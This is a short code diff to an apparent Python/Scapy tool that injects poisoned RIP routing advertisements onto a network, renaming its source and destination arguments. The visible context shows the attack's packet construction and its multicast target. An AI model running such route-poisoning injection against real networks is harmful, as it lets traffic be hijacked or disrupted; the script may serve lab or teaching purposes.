@@ -24,7 +24,7 @@ def main(args):
                                          mask=mask,
                                          nextHop="0.0.0.0",
                                          metric=args.metric)
-    evil = Ether()/IP(src=args.src_ip, dst=args.dst_ip)/udp/rip
+    evil = Ether()/IP(src=args.src, dst=args.dst)/udp/rip
 
     print(f"Injecting poisoned advertisement to {args.network}", end=" ")
     print(f"with metric {args.metric} on {args.iface} every {args.interval}s")
@@ -45,10 +45,10 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--interval', dest='interval',
                         default=5, help='The advertisement interval (5 sec)')
     parser.add_argument("-s", "--src",
-                        dest="src_ip",
+                        dest="src",
                         help="The source IP address for packets")
     parser.add_argument("-d", "--dst",
-                        dest="dst_ip",
+                        dest="dst",
                         default="224.0.0.9",
                         help="The destination IP address (224.0.0.9)")
     parser.add_argument("-i", "--iface",
